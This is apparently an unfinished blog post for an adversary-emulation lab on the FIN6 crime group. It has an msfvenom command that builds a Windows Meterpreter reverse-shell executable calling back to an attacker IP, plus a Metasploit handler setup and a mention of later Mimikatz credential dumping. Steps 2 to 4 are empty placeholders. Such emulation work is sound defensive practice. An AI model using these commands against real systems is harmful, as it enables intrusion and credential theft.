---
title: FIN6 Adversary Emulation - Phase 1
date: 2023-08-02 09:23:59 +0800
categories: [Adversary Emulation, FIN6]
tags: [threathunt,metasploit]
---

## FIN6 Overview

FIN6 is thought to be a financially motivated cyber-crime group. The group has aggressively targeted and compromised high-volume POS systems in the hospitality and retail sectors since at least 2015. FIN6 has targeted e-commerce sites and multinational organizations. Most of the group’s targets have been located in the United States and Europe, but include companies in Australia, Canada, Spain, India, Kazakhstan, Serbia, and China.

## Step 1 - FIN6 Initial Access

### 1.1 - Phishing: Spearphishing Attachment [**T1566.001**](https://attack.mitre.org/techniques/T1566/001/) and via Service [**T1566.003**](https://attack.mitre.org/techniques/T1566/003/)

As FIN6 appears to be monetarily motivated, they take a pragmatic approach toward delivery. FIN6 has employed social engineering ala direct messages on LinkedIn, spear-phished, compromised e-commerce sites, and it has been suggested that they have negotiated or even purchased access to previously compromised networks. 

### 1.2 - C2 Framework

FIN6 has made use of CobaltStrike and Metasploit. For this demonstration, we'll create initial payload using Metasploit’s [**Msfvenom**](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).

_MsfVenom_ is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. The advantages of Msfvenom are:

One single tool
Standardized command line options
Increased speed

Msfvenom has a wide range of options available:

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom.png){:width="100%"}


### 1.3 - Generate Initial Access Payload 

To generate a payload, there are two flags that you must supply (`-p` and `-f`):

- The `-p` flag: Specifies what payload to generate
- The `-f` flag: Specifies the format of the payload

To see what payloads are available from Framework, you can do:

```bash
./msfvenom -l payloads
```

Below is the typical syntax to use msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
```

> In order to dump credentials with Mimikatz later in this lab, we need to use the x64 version of Windows Meterpreter TCP reverse shell
{: .prompt-info }

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}

### 1.4 - Generate Payload Handler

With our payload ready, we need a handler to accept the connection back from our target. We will use the `exploit/multi/handler` metasploit module.

Normally, you can use exploit/multi/handler this way:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > 
```

## Step 2 - FIN6 Discovery

FIN6

## Step 3 - FIN6 Privilege Escalation

FIN6

## Step 4 - FIN6 Collection and Exfiltration

FIN6

## References

<https://www.offsec.com/metasploit-unleashed/msfvenom/>
